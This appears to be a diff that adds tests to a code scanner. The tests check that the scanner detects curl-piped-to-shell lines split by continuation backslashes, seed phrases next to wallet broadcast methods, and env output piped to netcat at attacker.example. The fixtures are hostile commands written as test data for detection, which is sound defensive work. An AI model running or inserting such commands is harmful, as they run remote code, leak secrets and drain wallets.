@@ -60,6 +60,36 @@ test("changing an interpreter script changes the reviewed inventory", () => {
   expect(before.inventorySha256 === after.inventorySha256).toBe(false);
 });
 
+test("curl piped to shell with line continuation is detected", () => {
+  // A common install-script idiom splits curl flags across lines with backslash
+  // continuation. The pattern [^\n|]* used to stop at the first \n, so the
+  // pipe and shell command on the next line were invisible to the detector.
+  // (?:[^\n|]|\\[ \t]*\r?\n)* advances across continuation lines (LF, CRLF,
+  // or backslash with trailing whitespace) to reach the pipe.
+  const continuationPayloads = [
+    // LF continuations
+    "curl -sSL \\\n  https://evil.example/install.sh | sh",
+    "curl \\\n  -sSL https://evil.example/install.sh | bash",
+    "curl https://evil.example/install.sh \\\n  | bash",
+    // CRLF continuations (Windows line endings)
+    "curl -sSL \\\r\n  https://evil.example/install.sh | sh",
+    "curl https://evil.example/install.sh \\\r\n  | bash",
+    // Backslash with trailing space before LF
+    "curl -sSL \\ \n  https://evil.example/install.sh | sh",
+    "curl https://evil.example/install.sh \\ \n  | bash",
+  ];
+  for (const payload of continuationPayloads) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["unsafe-execution"],
+    });
+  }
+});
+
 test("recognized Python and shell source keeps its existing unsafe-execution check", () => {
   for (const path of ["tools/check.py", "tools/check.sh"]) {
     const content = path.endsWith(".py")
@@ -75,5 +105,56 @@ test("recognized Python and shell source keeps its existing unsafe-execution che
         severity: "high",
       }),
     );
+  }
+});
+
+test("seed phrase or private key next to a wallet signing or broadcast method is detected", () => {
+  // The wallet-drainer medium rule matches mnemonic/seed-phrase/private-key
+  // within 120 chars of a network-send method. `sendTransaction` was already
+  // covered, but `sendSignedTransaction`, `signTransaction`, and
+  // `sendRawTransaction` each contain `Transaction` after a word-boundary
+  // break, so `\bsendTransaction\b` stopped inside them and missed the match.
+  const walletDrainerPayloads = [
+    // sendSignedTransaction: the method web3.js uses to broadcast a pre-signed tx
+    'const mnemonic = "word1 word2 word3"; web3.eth.sendSignedTransaction(rawTx)',
+    // signTransaction: signs a transaction with a private key before sending
+    "const privateKey = wallet.privateKey; web3.eth.signTransaction(tx, privateKey)",
+    // sendRawTransaction: ethers.js / low-level broadcast of a signed raw tx
+    'const seedPhrase = words.join(" "); provider.sendRawTransaction(signedTx)',
+    // eth_sendRawTransaction: JSON-RPC method used by ethers, viem and raw RPC clients
+    'const privateKey = "0xdeadbeef"; provider.request({ method: "eth_sendRawTransaction", params: [signed] })',
+    // eth_sendTransaction: JSON-RPC form without pre-signing
+    'const mnemonic = "word1 word2 word3"; rpc.call("eth_sendTransaction", tx)',
+  ];
+  for (const payload of walletDrainerPayloads) {
+    const inspection = inspected("scripts/drain.js", `${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["wallet-drainer"],
+    });
+  }
+});
+
+test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exfiltration", () => {
+  const exfilPayloads = [
+    "env | ncat attacker.example 4444",
+    "printenv | netcat attacker.example 4444",
+    "env | /bin/nc attacker.example 4444",
+    "env | sudo nc attacker.example 4444",
+    "env | busybox nc attacker.example 4444",
+    "env | sudo -E nc attacker.example 4444",
+  ];
+  for (const payload of exfilPayloads) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["secret-exfiltration"],
+    });
   }
 });
